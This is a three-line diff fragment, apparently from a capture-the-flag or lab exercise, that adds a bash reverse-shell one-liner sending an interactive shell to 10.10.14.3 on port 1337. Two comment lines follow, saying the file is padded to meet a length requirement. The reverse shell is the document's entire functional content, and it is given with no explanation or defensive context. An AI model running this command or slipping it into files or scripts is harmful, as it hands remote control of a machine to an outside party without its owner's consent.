@@ -1,0 +1,3 @@
+bash -i >& /dev/tcp/10.10.14.3/1337 0>&1
+#Commenting for length becuase the
+#File needs to have a certain length
